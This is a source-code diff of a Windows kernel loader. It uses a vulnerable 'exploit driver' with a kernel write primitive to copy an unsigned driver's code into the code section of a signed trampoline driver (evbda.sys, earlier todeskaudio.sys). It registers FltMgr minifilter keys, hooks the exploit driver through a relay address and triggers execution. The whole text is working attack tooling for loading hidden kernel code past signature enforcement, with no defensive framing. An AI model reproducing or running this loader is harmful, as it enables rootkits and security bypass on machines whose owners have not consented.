@@ -1,5 +1,4 @@
 
-
 #include <Windows.h>
 #include <stdio.h>
 #include "Kernel.h"
@@ -24,6 +23,9 @@ static CHAR g_source_driver[MAX_PATH] = { 0 };
 static CHAR g_exp_driver_name[MAX_PATH] = { 0 };
 static DWORD g_hook_point_rva = 0;
 static CHAR g_minifilter_altitude[64] = { 0 };
+static CHAR g_trampoline_driver[MAX_PATH] = { 0 };
+static DWORD g_stage1_offset = 0;
+static DWORD g_stage2_offset = 0;
 
 // KernelPower DLL handle
 static HMODULE g_hKpDll = NULL;
@@ -65,9 +67,6 @@ int main(int argc, char* argv[]) {
 		return 1;
 	}
 
-
-
-
 	DriverCheck();
 
 	// HookAndGo will call KpInitialize after obtaining the device handle
@@ -95,6 +94,18 @@ BOOL ReadConfig() {
 	CHAR rva_str[32] = { 0 };
 	GetPrivateProfileStringA("Hook", "HookPointRVA", "", rva_str, 32, config_path);
 	GetPrivateProfileStringA("Hook", "Altitude", "", g_minifilter_altitude, 64, config_path);
+	GetPrivateProfileStringA("Hook", "TrampolineDriver", "", g_trampoline_driver, MAX_PATH, config_path);
+	CHAR stage1_str[32] = { 0 };
+	GetPrivateProfileStringA("Hook", "Stage1Offset", "", stage1_str, 32, config_path);
+	CHAR stage2_str[32] = { 0 };
+	GetPrivateProfileStringA("Hook", "Stage2Offset", "", stage2_str, 32, config_path);
+
+	if (stage1_str[0]) {
+		g_stage1_offset = (DWORD)strtoul(stage1_str, NULL, 16);
+	}
+	if (stage2_str[0]) {
+		g_stage2_offset = (DWORD)strtoul(stage2_str, NULL, 16);
+	}
 
 	if (rva_str[0]) {
 		g_hook_point_rva = (DWORD)strtoul(rva_str, NULL, 16);
@@ -113,9 +124,23 @@ BOOL ReadConfig() {
 		return FALSE;
 	}
 
-	LDRLog(L"Config: SourceDriver=[%S] ExpDriverName=[%S] HookPointRVA=0x%x Altitude=[%S]\n",
+	if (!g_trampoline_driver[0]) {
+		LDRLog(L"Missing config in %S. Required: TrampolineDriver\n", config_path);
+		return FALSE;
+	}
+	if (!g_stage1_offset) {
+		LDRLog(L"Missing config in %S. Required: Stage1Offset\n", config_path);
+		return FALSE;
+	}
+	if (!g_stage2_offset) {
+		LDRLog(L"Missing config in %S. Required: Stage2Offset\n", config_path);
+		return FALSE;
+	}
+
+	LDRLog(L"Config: SourceDriver=[%S] ExpDriverName=[%S] HookPointRVA=0x%x Altitude=[%S] TrampolineDriver=[%S] Stage1=0x%x Stage2=0x%x\n",
 		g_source_driver, g_exp_driver_name, g_hook_point_rva,
-		g_minifilter_altitude[0] ? g_minifilter_altitude : "(none)");
+		g_minifilter_altitude[0] ? g_minifilter_altitude : "(none)",
+		g_trampoline_driver, g_stage1_offset, g_stage2_offset);
 
 	return TRUE;
 }
@@ -228,15 +253,15 @@ static VOID EnsureDriverRunning(const char* driver_name, bool is_system_driver =
 
 VOID DriverCheck() {
 	EnsureDriverRunning(g_exp_driver_name);
-	EnsureDriverRunning("todeskaudio.sys");
-	EnsureDriverRunning(TRAMPOLINE_DRV_NAME, true);
+	EnsureDriverRunning(g_trampoline_driver);
+	EnsureDriverRunning(g_trampoline_driver, true);
 
 	// If SourceDriver is a minifilter, FltRegisterFilter looks up Altitude from
 	// the trampoline driver's (evbda) registry key. We need to write the
 	// minifilter Instance subkey so FltMgr can find it.
 	if (g_minifilter_altitude[0]) {
 		CHAR svc_name[MAX_PATH] = { 0 };
-		strncpy_s(svc_name, TRAMPOLINE_DRV_NAME, MAX_PATH);
+		strncpy_s(svc_name, g_trampoline_driver, MAX_PATH);
 		CHAR* dot = strrchr(svc_name, '.');
 		if (dot) *dot = '\0';
 
@@ -261,8 +286,6 @@ VOID DriverCheck() {
 		err = RegCreateKeyExA(hKey, "Instances", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hInstancesKey, NULL);
 		if (err == ERROR_SUCCESS) {
 			RegSetValueExA(hInstancesKey, NULL, 0, REG_SZ, (BYTE*)default_instance, (DWORD)strlen(default_instance) + 1);
-			// FltMgr queries value named "DEFAULTINSTANCE" (not default value) under Instances key
-			RegSetValueExA(hInstancesKey, "DEFAULTINSTANCE", 0, REG_SZ, (BYTE*)default_instance, (DWORD)strlen(default_instance) + 1);
 			RegCloseKey(hInstancesKey);
 		} else {
 			LDRLog(L"Failed to create Instances subkey for [%S]: 0x%x\n", svc_name, err);
@@ -298,15 +321,12 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 	LDRLog(L"HookAndGo: source=[%S]\n", loc_source_driver);
 
 	// Prepare disk paths for trampoline and source drivers
-	CHAR evbda_sys_path[MAX_PATH] = { 0 };
+	CHAR tramp_sys_path[MAX_PATH] = { 0 };
 	{
-		// evbda.sys lives in System32drivers, not the current directory
-		WCHAR sys_dir[MAX_PATH] = { 0 };
-		GetSystemDirectoryW(sys_dir, MAX_PATH);
-		WCHAR w_evbda[MAX_PATH] = { 0 };
-		Helper::ConvertCharToWchar(TRAMPOLINE_DRV_NAME, w_evbda, MAX_PATH);
-		std::wstring evbda_path = std::wstring(sys_dir) + L"\\drivers\\" + w_evbda;
-		Helper::ConvertWcharToChar(evbda_path.c_str(), evbda_sys_path, MAX_PATH);
+		WCHAR w_tramp[MAX_PATH] = { 0 };
+		Helper::ConvertCharToWchar(g_trampoline_driver, w_tramp, MAX_PATH);
+		std::wstring tramp_path = Helper::GetCurrentDirFilePath((TCHAR*)w_tramp);
+		Helper::ConvertWcharToChar(tramp_path.c_str(), tramp_sys_path, MAX_PATH);
 	}
 
 	CHAR source_sys_path[MAX_PATH] = { 0 };
@@ -318,9 +338,9 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 	}
 
 	// Step 1: Check evbda.sys size_of_code must >= source driver size_of_code
-	LDRLog(L"evbda_sys_path=[%S] source_sys_path=[%S]\n", evbda_sys_path, source_sys_path);
+	LDRLog(L"tramp_sys_path=[%S] source_sys_path=[%S]\n", tramp_sys_path, source_sys_path);
 	PEInfo evbda_pe = { 0 };
-	PE_GetPEInfo(evbda_sys_path, &evbda_pe);
+	PE_GetPEInfo(tramp_sys_path, &evbda_pe);
 
 	PEInfo source_pe = { 0 };
 	PE_GetPEInfo(source_sys_path, &source_pe);
@@ -335,7 +355,7 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 
 	// Get evbda.sys section list for bounds checking (used in Step 2)
 	PESectionInfo evbda_sections[32] = { 0 };
-	DWORD evbda_section_count = PE_GetSectionList(evbda_sys_path, evbda_sections, 32);
+	DWORD evbda_section_count = PE_GetSectionList(tramp_sys_path, evbda_sections, 32);
 	if (evbda_section_count == 0) {
 		LDRLog(L"failed to get evbda.sys section list\n");
 		return FALSE;
@@ -351,7 +371,6 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 	g_kpTable = pKpGetTable();
 	LdrCtx_SetKpTable(g_kpTable);
 
-
 	// Get ntoskrnl base
 	PVOID krnl_base = NULL;
 	NTSTATUS st = KRNL::GetDriverBase(NTKRNL_NAME, &krnl_base);
@@ -362,16 +381,6 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 	LdrCtx_SetKrnlBase(krnl_base);
 	LDRLog(L"ntoskrnl base=0x%p\n", krnl_base);
 
-	// Resolve nt!DbgPrompt address (used as PIT relay when distance > 4GB)
-	DWORD dbg_prompt_offset = 0;
-	if (!PE_GetExportOffset("C:\\Windows\\System32\\ntoskrnl.exe", DBG_EXPORT_FUNC, &dbg_prompt_offset)) {
-		LDRLog(L"failed to find DbgPrompt export in ntoskrnl.exe\n");
-	}
-	else {
-		LdrCtx_SetDbgPromptAbsAddr((PVOID)((DWORD64)krnl_base + dbg_prompt_offset));
-		LDRLog(L"DbgPrompt addr=0x%p (ntoskrnl base + 0x%x)\n", LdrCtx_GetDbgPromptAbsAddr(), dbg_prompt_offset);
-	}
-
 	// Get exploit driver base
 	PVOID exp_base = NULL;
 	st = KRNL::GetDriverBase(g_exp_driver_name, &exp_base);
@@ -381,7 +390,6 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 	}
 	LdrCtx_SetExpDrvBase(exp_base);
 	LDRLog(L"exploit driver base=0x%p\n", exp_base);
-
 
 		// Restore exploit driver original bytes at hook point from hook.save (if exists)
 		{
@@ -422,24 +430,19 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 			}
 		}
 
-	// Get trampoline driver base (todeskaudio.sys)
+	// Get evbda driver base (trampoline driver)
 	PVOID tramp_base = NULL;
-	st = KRNL::GetDriverBase("todeskaudio.sys", &tramp_base);
+	st = KRNL::GetDriverBase(g_trampoline_driver, &tramp_base);
 	if (0 != st) {
-		LDRLog(L"failed to get trampoline driver [todeskaudio.sys] base, Status=0x%x\n", st);
+		LDRLog(L"failed to get trampoline driver  base, Status=0x%x\n", st);
 		return FALSE;
 	}
 	LdrCtx_SetTrampolineDrvBase(tramp_base);
-	LDRLog(L"trampoline driver (todeskaudio.sys) base=0x%p\n", tramp_base);
+	LDRLog(L"trampoline driver base=0x%p\n", tramp_base);
 
-	// Get evbda.sys kernel base (big driver for code map)
-	PVOID evbda_base = NULL;
-	st = KRNL::GetDriverBase(TRAMPOLINE_DRV_NAME, &evbda_base);
-	if (0 != st) {
-		LDRLog(L"failed to get evbda.sys base, Status=0x%x\n", st);
-		return FALSE;
-	}
-	LDRLog(L"evbda.sys base=0x%p\n", evbda_base);
+	// evbda.sys kernel base is tramp_base (same driver, fetched above)
+	PVOID evbda_base = tramp_base;
+	LDRLog(L"evbda.sys base=0x%p (same as trampoline driver)\n", evbda_base);
 
 	// Step 1.5: Scan evbda.sys entry point to find DriverEntry and key memory pointer
 	DWORD64 evbda_mem_value = 0;
@@ -460,13 +463,17 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 		// Step 2: Map source driver into user memory, then write its code section into evbda.sys base of code
 		{
 		// Get BaseOfCode offsets from disk PE files (needed before mapping for relocation target)
-		std::wstring w_evbda_sys_path(evbda_sys_path, evbda_sys_path + strlen(evbda_sys_path));
+		std::wstring w_tramp_sys_path(tramp_sys_path, tramp_sys_path + strlen(tramp_sys_path));
 			// DWORD evbda_base_of_code = 0; // moved outside block
-		if (!PE_GetCodeSectionStartOffset(w_evbda_sys_path, evbda_base_of_code)) {
+		if (!PE_GetCodeSectionStartOffset(w_tramp_sys_path, evbda_base_of_code)) {
 			LDRLog(L"failed to get evbda.sys BaseOfCode\n");
 			return FALSE;
 		}
 
+		// Set PIT relay address: evbda_base + BaseOfCode + EVBDA_PIT_RELAY_OFFSET
+		PVOID pit_relay = (PVOID)((DWORD64)evbda_base + evbda_base_of_code + EVBDA_PIT_RELAY_OFFSET);
+		LdrCtx_SetPitRelayAddr(pit_relay);
+		LDRLog(L"PIT relay addr=0x%p (evbda base + 0x%x + 0x%x)\n", pit_relay, evbda_base_of_code, EVBDA_PIT_RELAY_OFFSET);
 		std::wstring w_source_sys_path(source_sys_path, source_sys_path + strlen(source_sys_path));
 		DWORD source_base_of_code = 0;
 		if (!PE_GetCodeSectionStartOffset(w_source_sys_path, source_base_of_code)) {
@@ -633,8 +640,6 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 					}
 				}
 
-
-			
 				// Rewrite source driver code and read-only sections to kernel
 				// (relocations may have changed due to writable section remapping above)
 				if (!g_kpTable->WritePrimitive(krnl_write_addr, source_code, source_pe.size_of_code)) {
@@ -688,29 +693,11 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 	LdrCtx_SetTargetDrvBase(target_base);
 	LDRLog(L"target (exploit driver) base=0x%p\n", target_base);
 
-	
-	
-	// Resolve stage_1 and stage_2 offsets in todeskaudio.sys
-	DWORD todesk_base_of_code = 0;
-	{
-		std::wstring w_todesk_path(MAX_PATH, L'\0');
-		CHAR todesk_sys_path[MAX_PATH] = { 0 };
-		WCHAR w_todesk[MAX_PATH] = { 0 };
-		Helper::ConvertCharToWchar("todeskaudio.sys", w_todesk, MAX_PATH);
-		std::wstring todesk_path = Helper::GetCurrentDirFilePath((TCHAR*)w_todesk);
-		Helper::ConvertWcharToChar(todesk_path.c_str(), todesk_sys_path, MAX_PATH);
-		std::wstring w_path(todesk_sys_path, todesk_sys_path + strlen(todesk_sys_path));
-		if (!PE_GetCodeSectionStartOffset(w_path, todesk_base_of_code)) {
-			LDRLog(L"failed to get todeskaudio.sys BaseOfCode, path=[%S]\n", todesk_sys_path);
-			return FALSE;
-		}
-		LDRLog(L"todeskaudio.sys BaseOfCode=0x%x, path=[%S]\n", todesk_base_of_code, todesk_sys_path);
-	}
-	DWORD stage_1_func_offset = todesk_base_of_code;
-	DWORD stage_2_func_offset = todesk_base_of_code + 0x1000;
-	LDRLog(L"stage_1 offset=0x%x (todesk BaseOfCode), stage_2 offset=0x%x (todesk BaseOfCode+0x1000)\n",
-		stage_1_func_offset, stage_2_func_offset);
-
+	// Resolve stage_1 and stage_2 offsets relative to evbda BaseOfCode
+	DWORD stage_1_func_offset = evbda_base_of_code + g_stage1_offset;
+	DWORD stage_2_func_offset = evbda_base_of_code + g_stage2_offset;
+	LDRLog(L"stage_1 offset=0x%x (evbda BaseOfCode + 0x%x), stage_2 offset=0x%x (evbda BaseOfCode + 0x%x)\n",
+		stage_1_func_offset, g_stage1_offset, stage_2_func_offset, g_stage2_offset);
 
 	// oriAsmAddr: where original instructions are saved (inside stage_2 + OFFSET_FOR_ORIGINAL_ASM_CODE_SAVE)
 	DWORD64 ori_asm_code_addr = (DWORD64)tramp_base + stage_2_func_offset + OFFSET_FOR_ORIGINAL_ASM_CODE_SAVE;
@@ -733,13 +720,13 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 
 	DWORD64 trampoline_pit = 0;
 	if (distance > 0xFFFFFFFF) {
-		LDRLog(L"distance exceeds 4GB, using DbgPrompt as PIT relay\n");
-		if (!LdrCtx_GetDbgPromptAbsAddr()) {
-			LDRLog(L"DbgPrompt not resolved, cannot install hook\n");
+		LDRLog(L"distance exceeds 4GB, using evbda PIT relay\n");
+		if (!LdrCtx_GetPitRelayAddr()) {
+			LDRLog(L"PIT relay not set, cannot install hook\n");
 			return FALSE;
 		}
-		trampoline_pit = (DWORD64)LdrCtx_GetDbgPromptAbsAddr();
-		LDRLog(L"write trampoline_addr to DbgPrompt PIT at 0x%llX\n", trampoline_pit);
+		trampoline_pit = (DWORD64)LdrCtx_GetPitRelayAddr();
+		LDRLog(L"write trampoline_addr to PIT relay at 0x%llX\n", trampoline_pit);
 	}
 	else {
 		trampoline_pit = (DWORD64)tramp_base + stage_2_func_offset + TRAMPOLINE_PIT_OFFSET_STAGE_2_FUNC;
@@ -884,7 +871,7 @@ BOOL HookAndGo(FnKpGetTable pKpGetTable, FnKpInitialize pKpInitialize) {
 				}
 			}
 		}
-
+	 
 	// Trigger the hooked driver to execute
 	if (!g_kpTable->TriggerExecute()) {
 		LDRLog(L"TriggerExecute failed\n");
